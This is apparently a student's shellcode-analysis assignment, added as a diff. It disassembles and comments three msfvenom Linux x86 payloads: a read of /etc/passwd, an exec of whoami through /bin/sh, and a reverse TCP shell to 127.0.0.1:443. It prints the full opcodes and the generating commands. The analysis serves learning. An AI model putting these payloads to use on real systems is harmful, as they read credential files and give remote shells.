@@ -1,0 +1,276 @@
+
+
+
+
+
+; meta exec /bin/sh -c whoami
+
+;title : Shellcode analysis
+
+:Subject
+	for this assigment i took:
+	* linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=443
+	* linux/x86/read_file	file=/etc/passwd
+	* linux/x86/exec	cmd=whoami	
+
+
+i will use ndisasm for disasammbleing and i will make sure there will be comments on each instruction. and gdb to debug for further analysis.
+
+
+
+**linux/x86/read_file
+i generated the shellcode using msfvenom, and used ndisasm.
+---msfvenom -p linux/x86/read_file file=/etc/passwd | ndisasm -u -
+ 
+
+--------------------------------------------------
+00000000  EB36              jmp short 0x38
+00000002  B805000000        mov eax,0x5		;call to here 
+00000007  5B                pop ebx
+00000008  31C9              xor ecx,ecx
+0000000A  CD80              int 0x80
+0000000C  89C3              mov ebx,eax
+0000000E  B803000000        mov eax,0x3
+00000013  89E7              mov edi,esp
+00000015  89F9              mov ecx,edi
+00000017  BA00100000        mov edx,0x1000
+0000001C  CD80              int 0x80
+0000001E  89C2              mov edx,eax
+00000020  B804000000        mov eax,0x4
+00000025  BB01000000        mov ebx,0x1
+0000002A  CD80              int 0x80
+0000002C  B801000000        mov eax,0x1
+00000031  BB00000000        mov ebx,0x0
+00000036  CD80              int 0x80
+00000038  E8C5FFFFFF        call dword 0x2	; jmp here at first
+0000003D  2F                das			; /
+0000003E  657463            gs jz 0xa4		; etc
+00000041  2F                das			; /
+00000042  7061              jo 0xa5		; pa
+00000044  7373              jnc 0xb9		; ss
+00000046  7764              ja 0xac		; wd
+00000048  00                db 0x00		; null terminator
+---------------------------------------------------
+
+from the start we see the shellcode used the famous JMP-CALL-POP to get the value of "/etc/passwd".
+After that at top of the stack will be a pointer to "/etc/passwd". 
+
+
+-------------------------------------------------------
+00000002  B805000000        mov eax,0x5		; syscall number for open
+00000007  5B                pop ebx		; pointer to "/etc/passwd"
+00000008  31C9              xor ecx,ecx		; zero ecx for flags , zero means O_RDONLY
+0000000A  CD80              int 0x80		; open("/etc/passwd", O_RDONLY) = 3 
+-------------------------------------------------------
+moving 0x5 which is syscall number for open to eax, and loading a pointer for "/etc/passwd" into ebx to pass to open as the first argument, and finally we passed a zero as the flag using ecx for Read only mode.the syscall should return a file descriptor.
+
+--------------------------------------------------------
+0000000C  89C3              mov ebx,eax		;save the file descriptor returned from open syscall
+0000000E  B803000000        mov eax,0x3		;syscall number for read
+00000013  89E7              mov edi,esp		;move the address of the stack to edi, the pointer will be used for saving the data read.
+00000015  89F9              mov ecx,edi		;the pointer we moved before will be used as an argument
+00000017  BA00100000        mov edx,0x1000	;number of bytes to read
+0000001C  CD80              int 0x80		;read(3 = *File_descriptor* , ecx = *pointer_to_buffer_to_write_to*, 4096 = *number_of_bytes_to_read*) = 1652
+--------------------------------------------------------
+after saving the file descriptor to ebx, we changed eax to hold the syscall number of read.
+then used the stack for saving the content of the file, and finally the shellcde will read at max 4096 bytes. the syscall should return the number of bytes that was read.
+
+---------------------------------------------------------
+0000001E  89C2              mov edx,eax		; moving the value of eax which is the number of bytes that was read into ebx as argument for the next syscall
+00000020  B804000000        mov eax,0x4		; syscall number for write
+00000025  BB01000000        mov ebx,0x1		; the file descriptor to write to. 1= *Standard_output*
+0000002A  CD80              int 0x80		; write(1 = *File_descriptor* ,ecx = *buffer_to_read_from*, 1652 = *number_of_bytes_to_write*) = 1652
+---------------------------------------------------------
+first it move the number of bytes write into edx , and change the syscall function into write, and finally the file descriptor we are going to write to is Standard output which is 1
+
+
+---------------------------------------------------------
+0000002C  B801000000        mov eax,0x1		; syscall number for exit
+00000031  BB00000000        mov ebx,0x0		; exit status 0
+00000036  CD80              int 0x80		; exit(0)
+---------------------------------------------------------
+finally the shellcode will exit gracefully.
+
+
+
+**linux/x86/exec
+i generated the shellcode using msfvenom, and used ndisasm.
+---msfvenom -p linux/x86/exec cmd=whoami | ndisasm -u -
+
+---------------------------------------------------------------
+00000000  6A0B              push byte +0xb 
+00000002  58                pop eax 	
+00000003  99                cdq		
+00000004  52                push edx	
+00000005  66682D63          push word 0x632d	 
+00000009  89E7              mov edi,esp
+0000000B  682F736800        push dword 0x68732f		
+00000010  682F62696E        push dword 0x6e69622f	
+00000015  89E3              mov ebx,esp			
+00000017  52                push edx			
+00000018  E807000000        call dword 0x24		
+0000001D  7768              ja 0x87			
+0000001F  6F                outsd
+00000020  61                popad
+00000021  6D                insd
+00000022  6900575389E1      imul eax,[eax],dword 0xe1895357
+00000028  CD80              int 0x80
+----------------------------------------------------------------
+
+this shellcode is easy but it used a technique that maybe new to you, as you can see at offset 18, there is a call instruction to relative address, that relative address is in the middle of an opcodes.
+that means that we will need to chnage the disasmbler output to match the actual code taht will be executed.
+
+
+-----------------------------------------------------------------
+00000000  6A0B              push byte +0xb 
+00000002  58                pop eax 	
+00000003  99                cdq		
+00000004  52                push edx	
+00000005  66682D63          push word 0x632d	 
+00000009  89E7              mov edi,esp
+0000000B  682F736800        push dword 0x68732f		
+00000010  682F62696E        push dword 0x6e69622f	
+00000015  89E3              mov ebx,esp			
+00000017  52                push edx			
+00000018  E807000000        call dword 0x24	
+	  77686f616D6900	
+0000001D  57                push edi	; address the call will jmp to
+0000001E  53                push ebx	
+00000020  89E1              mov ecx,esp	
+00000022  CD80              int 0x80
+------------------------------------------------------------------
+so after we cleaned up the shellcode, we will divide the shellcode like the precious one to descripe it
+
+-----------------------------------------------------------------
+00000000  6A0B              push byte +0xb 	;push 0xb into the stack 
+00000002  58                pop eax 		; pop 0xb into eax, 0xb is the syscall number for execve
+00000003  99                cdq			; this instruction will take the sign bit from eax which is 0 and will change every bit in edx into it. so zero out edx
+00000004  52                push edx		; push 0 
+00000005  66682D63          push word 0x632d	;push the ascii value "-c"
+00000009  89E7              mov edi,esp		; get a pointer to "-c"
+------------------------------------------------------------------
+here the shellcode set up the syscall number in eax and managed to have a pointer to the string "-c" to pass as args for execve
+
+-------------------------------------------------------------------
+0000000B  682F736800        push dword 0x68732f		;/sh , notice here we pushed only 3 bytes, since we pushed a dword, the last byte will be 0
+00000010  682F62696E        push dword 0x6e69622f	;/bin
+00000015  89E3              mov ebx,esp			; move the pointer to "/bin/sh" to ebx
+00000017  52                push edx			; push 0
+--------------------------------------------------------------------
+here the shellcode managed to set up a pointer to "/bin/sh" 
+
+--------------------------------------------------------------------
+	  77686f616D6900		; will be a pointer to "whoami"	
+0000001D  57                push edi	; push a pointer to "-c"
+0000001E  53                push ebx	; push a pointer to "/bin/bash"
+00000020  89E1              mov ecx,esp	; get a pointer to the args 
+00000022  CD80              int 0x80	; execve("/bin/sh", ["/bin/sh", "-c", "whoami"])
+------------------------------------------------------------------
+as you can see when we execute the syscall.
+	eax will hold the syscall number
+	ebx will be a pointer to "/bin/sh" which is the binary we will execute
+	ecx will be a pointer to several pointer which is the args [ "/bin/sh" , "-c" , "whoami"]
+after that /bin/sh will handle the writing of output to the user.
+
+
+
+
+**linux/x86/shell_reverse_tcp 
+i generated the shellcode using msfvenom, and used ndisasm.
+---msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=443 | ndisasm -u -
+
+
+
+-----------------------------------------------------------------------
+00000000  31DB              xor ebx,ebx		;zero out ebx
+00000002  F7E3              mul ebx		;zero out eax and edx
+00000004  53                push ebx		; save 0 at top of stack
+00000005  43                inc ebx		; increase ebx by one for socketcall number, in this case it will be socket()
+00000006  53                push ebx		; save 1 as top of the stack
+00000007  6A02              push byte +0x2	; push 0x2 at top of the stack, 0x2 represent AF_INET
+00000009  89E1              mov ecx,esp		; address for arguments for socket() which will be (AF_INET=2,SOCK_STREAM=1,IPPROTO_IP=0)
+0000000B  B066              mov al,0x66		; syscall for socketcall
+0000000D  CD80              int 0x80		; initiate syscall
+0000000F  93                xchg eax,ebx	; move the file descriptor created for the socket to ebx
+00000010  59                pop ecx		; move 0x2 to ecx register
+00000011  B03F              mov al,0x3f		; syscall for dup2()
+00000013  CD80              int 0x80		; initiate syscall 
+00000015  49                dec ecx		; decrease the ecx register by 1
+00000016  79F9              jns 0x11		; check if zero flag is on and jump 
+00000018  687F000001        push dword 0x100007f ; push the host ip address in hex  
+0000001D  68020001BB        push dword 0xbb010002 ; push the port and AF_INET together since both of them are 16 bit value
+00000022  89E1              mov ecx,esp		  ; address for arguments for connect() which will be (File_descripto,[AF_INET=0x02,port=0x01bb,address=0x7f000001])
+00000024  B066              mov al,0x66		  ; syscall for socketcall
+00000026  50                push eax		  ; push the value of socketLen_t
+00000027  51                push ecx		  ; push the value of SOCKETADDR struct
+00000028  53                push ebx		  ; push  the value of file descritpor  
+00000029  B303              mov bl,0x3		  ; id number for socketcall, 3 means CONNECT()
+0000002B  89E1              mov ecx,esp		  ; argument pointer for connect() will be (FILE_descriptor, [])
+0000002D  CD80              int 0x80		  ; initiate syscall 
+0000002F  52                push edx		  ; push 0 
+00000030  686E2F7368        push dword 0x68732f6e ; n/sh
+00000035  682F2F6269        push dword 0x69622f2f ;/bi
+0000003A  89E3              mov ebx,esp		  ; move address of esp which conatin "/bin/sh" to ebx
+0000003C  52                push edx		  ; push 0
+0000003D  53                push ebx		  ; push the address of "/bin/sh"
+0000003E  89E1              mov ecx,esp		  ; move the address of esp which contain an address to "/bin/sh"
+00000040  B00B              mov al,0xb		  ; syscall number for execve
+00000042  CD80              int 0x80		  ; initiate syscall 
+--------------------------------------------------------------------------
+
+from the we noticed the use of socketcall syscall, let divide the shellcode into smaller pices for further analysis
+
+--------------------------------------------------------------------------
+00000000  31DB              xor ebx,ebx		; zero out ebx
+00000002  F7E3              mul ebx		; zero out  edx
+00000004  53                push ebx		; save 0 at top of stack
+00000005  43                inc ebx		; increase ebx by one for socketcall number, in this case it will be socket()
+00000006  53                push ebx		; save 1 as top of the stack
+00000007  6A02              push byte +0x2	; push 0x2 at top of the stack, 0x2 represent AF_INET
+00000009  89E1              mov ecx,esp		; address for arguments for socket() which will be (AF_INET=2,SOCK_STREAM=1,IPPROTO_IP=0)
+0000000B  B066              mov al,0x66		; syscall for socketcall
+0000000D  CD80              int 0x80		; socketcall(1, [PF_INET, SOCK_STREAM, IPPROTO_IP]) = 3
+---------------------------------------------------------------------------
+in this part of shellcode, we set up the connect socketcall, ebx=1 means SOCKET() , and since we used socketcall as out syscall we need to pass a pointer to args we will pass.
+the shellcode used the stack and pushed the arguments IPPROTO_IP using ebx as offset 4, and SOCKSTREAM using also ebx after incrementing in offset 6 , and AF_INET  which pushed into the stack and got a pointer to the args.
+
+-----------------------------------------------------------------------------
+0000000F  93                xchg eax,ebx	; move the file descriptor created for the socket to ebx to use in dup2 syscall
+00000010  59                pop ecx		; move 0x2 to ecx register which is the start file descriptor to duplicate
+00000011  B03F              mov al,0x3f		; syscall number for dup2()
+00000013  CD80              int 0x80		; dup2(3 = *File_descritpor_from_socketcall*, 2 = *File_descriptor_to_dup*) , will execute several time with all 3 File Descritpors 2,1,0
+00000015  49                dec ecx		; decrease the ecx register by 1
+00000016  79F9              jns 0x11		; check if sign flag is off and jump to offset 11, basically it check if ecx register is not negative to jump   
+------------------------------------------------------------------------------
+in here the shellcode, will get the file descriptor returened from the socket, and there will a loop to duplicate the 3 file descritpors with our socket file descripor
+
+------------------------------------------------------------------------------
+00000018  687F000001        push dword 0x100007f ; push the host ip address in hex  
+0000001D  68020001BB        push dword 0xbb010002 ; push the port and AF_INET together since both of them are 16 bit value
+00000022  89E1              mov ecx,esp		  ; will move a pointer to the structaddr which is [2 byte AF_INET, 2 byte port, 4 byte address]
+00000024  B066              mov al,0x66		  ; syscall for socketcall
+00000026  50                push eax		  ; push the value of socketLen_t
+00000027  51                push ecx		  ; push the value of SOCKETADDR struct
+00000028  53                push ebx		  ; push  the value of file descritpor  
+00000029  B303              mov bl,0x3		  ; id number for socketcall, 3 means CONNECT()
+0000002B  89E1              mov ecx,esp		  ; address for arguments for connect() which will be (File_descriptor,[AF_INET=0x02,port=0x01bb,address=0x7f000001], 106 = *Structlen*)
+0000002D  CD80              int 0x80		  ; socketcall(3, [3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("127.0.0.1")}, 102))   
+-------------------------------------------------------------------------------
+in here the shellcode will setup SOCKETADDR in the stack with appropriate values, and change the value of ebx to 3 which is 3, and finally intiate the syscall to socketcall
+
+-------------------------------------------------------------------------------
+0000002F  52                push edx		  ; push 0 
+00000030  686E2F7368        push dword 0x68732f6e ; n/sh
+00000035  682F2F6269        push dword 0x69622f2f ;/bi
+0000003A  89E3              mov ebx,esp		  ; move address of esp which conatin "/bin/sh" to ebx
+0000003C  52                push edx		  ; push 0
+0000003D  53                push ebx		  ; push the address of "/bin/sh"
+0000003E  89E1              mov ecx,esp		  ; move the address of esp which contain an address to "/bin/sh"
+00000040  B00B              mov al,0xb		  ; syscall number for execve
+00000042  CD80              int 0x80		  ; execve("//bin/sh", ["//bin/sh"])
+---------------------------------------------------------------------------------
+and finally since we duplicated the 3 file descritpors, if we executed /bin/sh we will get a shell on our reciving host which we connect to.
+
+Ref:http://faydoc.tripod.com/cpu/
+Ref:https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h for socketcall numbers
+Ref:https://stackoverflow.com/questions/36464879/when-and-why-do-we-sign-extend-and-use-cdq-with-mul-div for cdq
